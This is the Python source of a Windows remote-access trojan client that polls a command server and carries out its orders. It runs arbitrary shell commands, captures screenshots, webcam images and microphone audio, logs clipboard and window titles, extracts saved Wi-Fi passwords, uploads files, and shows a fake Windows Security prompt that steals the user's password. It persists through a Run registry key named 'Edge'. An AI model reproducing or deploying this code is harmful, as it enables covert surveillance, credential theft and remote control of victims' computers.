import getpass
import requests
import json
import urllib
from urllib.request import Request, urlopen
from requests import get
import platform
import socket
import psutil
import shutil
import re
import subprocess
import os
import sys
from PIL import ImageGrab
import time
import json
import wmi
from screeninfo import get_monitors
from comtypes import CLSCTX_ALL
import cv2
from ctypes import *
import win32clipboard
import threading
import win32gui

from tkinter import messagebox
import tkinter
import tempfile

from threading import Thread
import pyaudio
import wave

class Agent:
    def __init__(self):
        self.install_dir = "C:/ultix"
        self.link = CommandServerLink

        # Logger Options
        self.loggerSleep = intForTime
        self.logger_clipboard = loggerClipboard
        self.logger_windowText = loggerWindow
        self.logger_activeProcesses = loggerProcesses
        self.logger_wifiPasswords = loggerWifiPasswords

        ## Persist

        self.persistEnabled = persistTrueorFalse
        self.persist_folder = persistFolder

        self.persist_dir = f"{self.getTEMP()}\{self.persist_folder}"

        self.filename = os.path.basename(sys.argv[0])
        if self.filename.endswith(".exe"):
            pass
        else:
            self.filename = f"{self.filename}w" # Convert to  Python file without black screen .py -> pyw
        self.persist_dir_file = f"{self.persist_dir}\{self.filename}"
        self.value = True
        self.time = 5
        self.status = "Active"
        self.intForIdle = 0
        self.start()

    def start(self):
        self.thread(self.logger) # Creata a new thread for the logger, so it can log & receive command
        self.persistOnRun()
        self.install()
        self.sendPostInfo(self.link)
        self.checkCmd(self.link)
        self.fileManager("C:")
        while True:
            print("<== New Request ==>")
            print(self.time)
            time.sleep(self.time)
            self.sendPostInfo(self.link)
            self.checkCmd(self.link)

        # ###starts

    def persistOnRun(self):
        if self.persistEnabled == True:
            self.addPersist()

    def logger(self):
        if self.loggerSleep != False: # if the value is not False it meens there is a int for the logger to log
            while True:
                sleepTime = int(self.loggerSleep)
                time.sleep(sleepTime)
                if self.logger_clipboard  == True:
                    self.getclipboard()
                if self.logger_windowText == True:
                    self.windowText()
                if self.logger_activeProcesses == True:
                    self.allProc()
                if self.logger_wifiPasswords == True:
                    self.WifiPasswords()

    def install(self):
        if not os.path.exists(self.install_dir):
            try:
                os.mkdir(self.install_dir)
            except Exception as e:
                print(e)

    def checkForIdle(self):
        print(self.status)
        if self.intForIdle >= 5 and self.status != "Idle":
            print("Idle status Starting ")
            self.time = 10
            print(self.time)
            self.status = "Idle"

    def checkForFileManager(self):
        print(self.status)
        if self.status != "FileManager":
            print("FileManager status Starting ")
            self.time = 3
            print(self.time)
            self.status = "FileManager"
        else:
            pass

    def resetIdleStatus(self):
        if self.status == "Idle":
            self.intForIdle = 0
            self.status = "Active"
            self.time = 5
            print(f"Removing Idle Status: {self.status}")
            print(f"Timer resseted: {self.time}")
        else:
            self.intForIdle = 0

    def checkCmd(self, url):
        print("[++] Checking")
        data = {
            "checkCmd": "yes",
            "uid": self.makeUID(),
        }

        r = requests.post(url, data=data)
        commands = r.text
        print(commands)
        if commands == "":
            print("No Command")
            self.intForIdle += 1
            print(self.intForIdle)
            self.checkForIdle()
        else:
            print("COmmand receieved")
            self.resetIdleStatus()
            Command = json.loads(commands)
            CommandType = Command["command"]
            CommandParameters = Command["commandParameters"]
            if CommandType == "screenshot":
                print("Taking screensot!")
                print(CommandParameters)
                self.takeScreenshot()
            elif CommandType == "camera":
                self.takeCameraPicture(CommandParameters)
            elif CommandType == "terminal":
                self.thread(self.executeTerminal(CommandParameters))
            elif CommandType == "exploreFolder":
                self.checkForFileManager()
                self.fileManager(CommandParameters)
            elif CommandType == "download":
                self.checkForFileManager()
                self.handleDownloadedFile(CommandParameters)
            elif CommandType == "clipboard":
                self.getclipboard()
            elif CommandType == "Shutdown":
                self.Shutdown()
            elif CommandType == "Reboot":
                self.Reboot() 
            elif CommandType == "wifipasswords":
                self.WifiPasswords()
            elif CommandType == "proc":
                self.allProc()
            elif CommandType == "windowText":
                self.windowText()
            elif CommandType == "winlogin":
                self.thread(self.makeWinLogin)
            elif  "MessageBox" in CommandType:
                thread = Thread(target=self.messagebox, args=(CommandType, CommandParameters))
                thread.start()
            elif CommandType == "microphone":
                self.recordMic(CommandParameters)
            elif CommandType == "uninstallUID":
                self.uninstall()
            elif CommandType == "addPersist":
                self.addPersist()
            elif CommandType == "delPersist":
                self.delPersist()
            else:
                print("No COmmand is Availble")

    def sendFile(self, url, type, uid, parameters, file):
        jsonData =  {
            type: "yes",
            "uid": uid,
            "parameters": parameters
        } 

        files = {
            "file": open(file, "rb") 
        }
        r = requests.post(url, data=jsonData, files=files)

    def uploadDownloadedFile(self, url, type, uid, filename, file):
        jsonData =  {
            type: "yes",
            "uid": uid,
            "fileName": filename
        } 

        files = {
            "file": open(file, "rb") 
        }
        r = requests.post(url, data=jsonData, files=files)
        print(r.text)

    def sendInfo(self, url, type, uid,  data, data1):
        jsonData = {
            type: "yes",
            "uid": uid,
            "data": data,
            "data1": data1
        }
        print("sending")
        print(jsonData)
        r = requests.post(url, data=jsonData)
        print(r.text)

    def sendClip(self, url, type, uid,  data):
        jsonData = {
            type: "yes",
            "uid": uid,
            "clipdata": data
        }
        print("sending")
        print(jsonData)
        r = requests.post(url, data=jsonData)
        print(r.text)

    def sendPostInfo(self, url):
        data = {
            "addToDb": "yes",
            "status": self.status,
            "uid":  self.makeUID(),
            "persist": self.checkPersist(),
            "persistDir": self.persist_dir_file,
            "sysarchitecture": self.getSystemArchitecture(),
            "os": self.getOS(),
            "platform":  self.getPlatform(),
            "username": self.getUsername(),
            "ram": self.getRam(),
            "cpu": self.getCPU(),
            "format": self.getFormat(),
            "disksizetotal": self.disktotal(),
            "disksizeused": self.diskused(),
            "disksizefree": self.diskfree(),
            "gpu": self.getGPU(),
            "vm": self.ISVM(),
            "syslan": self.getSystemLan(),
            "installDir": self.getInstallDir(),
            "totalMonitors": self.getTotalScreens(),
            "prodKey": self.getProdKey(),
            "batteryStatus": self.getBatteryStatus(),
            "publicIP": self.getIP(),
            "privateIP": self.getPrivIP(),
            "latitude": self.getIPLat(),
            "longitude": self.getIPLong(),
            "ipcountry": self.getIPCountry(),
            "ipcountrycode": self.getIPCountryCode(),
            "iptimezone": self.getIPTimeZone(),
            "ipcity": self.getIPCity(),
            "ipcontinent": self.getIPContinent(),
            "ipregion": self.getIPRegion()
        }

        r = requests.post(url, data=data)
        print(r.text)

    def sendFileExplorer(self, url, dir, data):
        JsonData = {    
            "uid": self.makeUID(),
            "exploreFiles": "yes",
            "dir": dir,
            "data": data
        }

        r = requests.post(url, data=JsonData)
        print(r.text)

    def thread(self, thread):
        t = threading.Thread(target=thread)
        t._running = True
        t.daemon = True
        t.start()        

    def makeUID(self):
        try:
            username = self.getUsername()
            ip = self.getIP()
            os = self.getPlatform()
            id = f"{os}-{username}@{ip}"
        except:
            id = "N/A"
        return id

    def getInstallDir(self):
        try:
            installDir = sys.argv[0]
        except:
            installDir = "N/A"
        return installDir

    def getTEMP(self):
        try:
            tmp = tempfile.gettempdir()
        except:
            tmp = "N/A"
        return tmp
    
    def checkPersist(self):
        import os
        if os.path.exists(self.persist_dir):
            status = "True"
        else:
            status = "False"
        return status

    def addPersist(self):
        import os

        if not os.path.exists(self.persist_dir):
            os.mkdir(self.persist_dir)
            shutil.copyfile(self.getInstallDir(), self.persist_dir_file)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Edge /t REG_SZ /d "' + self.persist_dir_file + '" /f', shell=True)
            print("Added")
        else:
            print("Already File")
    
    def delPersist(self):
        try:
            if os.path.exists(self.persist_dir):
                shutil.rmtree(self.persist_dir)
            subprocess.call("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Edge /f", shell=True)
        except:
            print("Failed")

    def getFormat(self):
        try:
            format_dir = self.getInstallDir()
            if format_dir.endswith(".py"):
                format = "Python"
            elif format_dir.endswith(".exe"):
                format = "Windows"
            else:
                format = "Not Supported"
        except:
            format = "N/A"
        print(format)
        return format
        
    def getPrivIP(self):
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname) 
        except:
            local_ip = "N/A"
        return local_ip

    def getSystemArchitecture(self):
        try:
            bits = platform.architecture()[-2] #cutoff un-needed info
        except:
            bits = "N/A"
        return bits
        
    def getRam(self):
        try:
            totalRam = psutil.virtual_memory().total  / 1024 / 1024
            ram = str(totalRam)[0]
            ram1 = str(totalRam)[1]
            finalRam = f"{ram}.{ram1}GB"
        except:
            finalRam = "N/A"
        return finalRam

    def getIP(self):
        try:
            ip = get('https://api.ipify.org').text
        except:
            ip = "N/A"
        return ip

    def getOS(self):
        try:
            gtOS = platform.system()
        except:
            gtOS = "N/A"
        return gtOS

    def getPlatform(self):
        try:
            os = platform.system() 
            version = platform.version()
        except:
            os = "N/A"
            version = "N/A"
        Platform = f"{os}-{version[:2]}"
        return Platform

    def getCPU(self):
        try:
            cpu = platform.processor()
        except:
            cpu = "N/A"
        return cpu

    def getUsername(self):
        try:
            username = getpass.getuser()
        except:
            username = "N/A"
        return username

    def ISVM(self):
        try:
            rules = ['Virtualbox', 'vmbox', 'vmware']
            command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
                                        stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
                                        creationflags=0x08000000)
            out, err = command.communicate()
            command.wait()
            for rule in rules:
                if re.search(rule, out, re.IGNORECASE):
                    vm = "True"
            vm = "False"
        except:
            vm = "N/A"
        return vm

    def getSystemLan(self):
        try:
            import os #my python has a OS module error so i need to import it twice...
            lan = os.popen('systeminfo | findstr /B /C:"System Locale"').read().replace("\n", "").replace("System Locale:", "").replace(" ", "").replace(";", "-")
        except:
            lan = "N/A"
        return lan

### IP Info
    def getIPCountry(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            country = data["geoplugin_countryName"]
        except:
            country = "Unkown"
        return country

    def getIPLat(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            lat = data["geoplugin_latitude"]
        except:
            lat = "Unkown"
        return lat

    def getIPLong(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            long = data["geoplugin_longitude"]
        except:
            long = "Unkown"
        return long
    def getIPCountryCode(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            countcode = data["geoplugin_countryCode"]
            countrycode = countcode.lower() #lower case is needed since the image flags form the server are in lowercase: for example in the server the country code is gonna be converted from nl to images/Flags/nl.svg
        except:
            countrycode = "Unkown"
        return countrycode

    def getIPTimeZone(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            ipTimezone = data["geoplugin_timezone"]
        except:
            ipTimezonee = "Unkown"
        return ipTimezone

    def getIPCity(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            IPCity = data["geoplugin_city"]
        except:
            IPCity = "Unkown"
        return IPCity

    def getIPContinent(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            IPContinent = data["geoplugin_continentName"]
        except:
            IPContinent = "Unkown"
        return IPContinent

    def getIPRegion(self):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip="
            response=urlopen(url)
            data=json.load(response)
            IPRegion = data["geoplugin_regionName"]
        except:
            IPRegion = "Unkown"
        return IPRegion

### DISK
    def disktotal(self):
        try:
            BytesPerGB = 1024 ** 3
            (total, used, free) = shutil.disk_usage("/")
            diskTotal =  "%.2fGB" % (float(total)/BytesPerGB)
        except:
            diskTotal = "N/A"
        return diskTotal

    def diskused(self):
        try:
            BytesPerGB = 1024 ** 3
            (total, used, free) = shutil.disk_usage("/")
            diskUsed =  "%.2fGB" % (float(used)/BytesPerGB)
        except:
            diskUsed = "N/A"
        return diskUsed

    def diskfree(self):
        try:
            BytesPerGB = 1024 ** 3
            (total, used, free) = shutil.disk_usage("/")
            diskFree = "%.2fGB" % (float(free)/BytesPerGB)
        except:
            diskFree = "N/A"
        return diskFree

### Hardware INFO
    def getGPU(self):
        try:
            computer = wmi.WMI()
            gpu_info = computer.Win32_VideoController()[0]
            Gpu = format(gpu_info.Name)
        except:
            Gpu = "N/A"
        return Gpu

    def getTotalScreens(self):
        try:
            self.totalMonitors = 0
            for monitor in get_monitors():
                self.totalMonitors += 1
        except:
            self.totalMonitors = "N/A"
        return self.totalMonitors

    def getBatteryStatus(self):
        try:
            BatteryStatus = psutil.sensors_battery()
            
            if BatteryStatus == None:
                BatteryStatus = "No Battery (Prob. a Desktop.)" 
        except:
            BatteryStatus = "N/A"

        return BatteryStatus

    def getProdKey(self):
        try:
            import os
            command_prodKey = 'systeminfo | findstr /C:"Product ID:"'
            final_prodKey = os.popen(command_prodKey)
            prodKey = final_prodKey.read().replace("Product ID:", "").replace(" ", "").replace("\n", "")
        except:
            prodKey = "N/A"
        return prodKey

## Control Functions
    def takeScreenshot(self):
        file_screenshot = fr"{self.install_dir}/screen.png"
        try:
            Screenhot = ImageGrab.grab(bbox=None, include_layered_windows=True, all_screens=True, xdisplay=None)
            Screenhot.save(file_screenshot)
            self.sendFile(self.link, "screenshot", self.makeUID(), "None", file_screenshot)
        except Exception as e:
            print(e)

    def takeCameraPicture(self, cam):
        file_camera = fr"{self.install_dir}/snap.png"
        camera = int(cam)       
        try:
            webcam = cv2.VideoCapture(camera)
            check, frame = webcam.read()
            cv2.imwrite(filename=file_camera, img=frame)
            webcam.release()
            self.sendFile(self.link, "camera", self.makeUID(), cam, file_camera)
        except Exception as e:
            print(e)

    def executeTerminal(self, command):
        try:
            cmd = command
            result = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True, creationflags=0x08000000)
            comand, err = result.communicate()
            result.wait()    
            print(comand)
            print(result)
            self.sendInfo(self.link, "terminal", self.makeUID(), command, comand)       
        except Exception as e:
            print(e)

    def SetVolume(self, Volume):
        def calc(x):
            return x / 2
        
        import pyautogui
        volume_set = calc(Volume)
        print(volume_set)
        for i in range(50):
            pyautogui.press("volumedown")

        for i in range(volume_set):
            pyautogui.press("volumeup")

    def Shutdown(self):
        try: 
            import os
            os.system("shutdown /s /t 0")
        except:
            pass
    
    def Reboot(self):
        try:
            import os
            os.system("shutdown -t 0 -r -f")
        except:
            pass

    def handleDownloadedFile(self, parameters):
        parameterINV = parameters.replace("\\", "/") ## replace invalid caracters
        parameter = parameterINV.replace("//", "/")
        file = fr"{parameter}"
        file_good = file.split("/")
        f = file_good[-1]
        print(f)
        # print(parameter
        self.uploadDownloadedFile(self.link, "downloadFile", self.makeUID(), f, parameter)

    def getclipboard(self):
        win32clipboard.OpenClipboard()
        clipdata = win32clipboard.GetClipboardData()
        self.sendClip(self.link, "clipboard", self.makeUID(), clipdata)
        win32clipboard.CloseClipboard()

    def fileManager(self, folder):
        try:
            import os
            print(folder)
            print("Active DIR" + os.getcwd())
            if folder == "../":
                print("Going back")
                os.chdir("..")
                print("WentBack to" + os.getcwd())
                activeDir = os.getcwd()
            else:
                activeDir = folder
                print("Active DIR" + os.getcwd())
                os.chdir(activeDir)
                print("Changed to " + os.getcwd())
            activeDir = os.getcwd().replace("\\", "//")
            data = ""
            for x in os.listdir():

                if os.path.isdir(f"{activeDir}//{x}"):
                    data +=  f"Dir{activeDir}//{x}"
                else:
                    data += f"{activeDir}//{x}"
                data += "," 
            print(data)
            self.sendFileExplorer(self.link, activeDir, data)

        except Exception as e:
            print(e)

    def WifiPasswords(self):
        try:
            self.wifidata = ""
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        self.wifidata += "{:<},  {:<}".format(i, results[0])
                    except IndexError:
                        self.wifidata += "{:<},  {:<}".format(i, "")
                except subprocess.CalledProcessError:
                    self.wifidata += "{:<},  {:<}".format(i, "ENCODING ERROR")
                self.wifidata += "."
            print(self.wifidata)
        except:
            self.wifidata += "No Wifi availble, No Wifi availble"
        self.sendInfo(self.link, "wifi", self.makeUID(), self.wifidata, "")

    def allProc(self):
        try:
            listOfProcessNames = list()
            self.Procdata = ""
            for proc in psutil.process_iter():
                pInfoDict = proc.as_dict(attrs=['pid', 'name'])
                listOfProcessNames.append(pInfoDict)
                procPID = pInfoDict["pid"]
                procName = pInfoDict["name"]
                self.Procdata += f"{procPID}"
                self.Procdata += ","
                self.Procdata += f"{procName}"
                self.Procdata += "NewProc"
            
        except Exception as e:
            self.procData += f"Failed,{e}"
        self.sendInfo(self.link, "proc", self.makeUID(), self.Procdata, "")

    def windowText(self):
        try:
            current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            current_window =  "N/A"
        self.sendInfo(self.link,  "window", self.makeUID(), current_window, "")

    def messagebox(self, box, contents):
        messagebox = box
        
        messageboxContents = contents.split(",")

        Title = messageboxContents[0]
        Message = messageboxContents[1]

        if "Info" in messagebox:
            mes = tkinter.messagebox.showinfo(title=Title, message=Message)
        if "Error" in messagebox:
            mes = tkinter.messagebox.showerror(title=Title, message=Message)
        if  "Warning" in messagebox:
            mes = tkinter.messagebox.showwarning(title=Title, message=Message)
        
        print("MessageBox Done!")
        
    def makeWinLogin(self):
        try:
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)

            def shell():   
                output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output

            result_cred = str(shell().stdout.decode('CP437'))
        except:
            result_cred = "N/A"
        
        self.sendInfo(self.link, "winlogin", self.makeUID(), result_cred, " ")

    def uninstall(self):
        if os.path.exists(self.install_dir):
            shutil.rmtree(self.install_dir)
        if os.path.exists(self.persist_dir):
            shutil.rmtree(self.persist_dir)
        sys.exit(0)

    def recordMic(self, seconds):
        tot_seconds = seconds + 1
        seconds_to_records  = int(tot_seconds)
        self.file_microphone  = f"{self.install_dir}/mic.wav"
        try:
            def mic():
                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 1
                RATE = 44100 

                p = pyaudio.PyAudio()

                stream = p.open(format=FORMAT,
                                channels=CHANNELS,
                                rate=RATE,
                                input=True,
                                frames_per_buffer=CHUNK)
                frames = []
                seconds = seconds_to_records

                for i in range(0, int(RATE / CHUNK * seconds)):

                    data = stream.read(CHUNK)

                    frames.append(data)

                stream.start_stream()
                stream.close()
                p.terminate()

                wf = wave.open(self.file_microphone, "wb")
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()

                self.sendFile(self.link, "microphone", self.makeUID(), " ", self.file_microphone)
            self.thread(mic)
        except Exception as e:
            print(e)

def main():
    Agent()

if __name__ == "__main__":
    main()

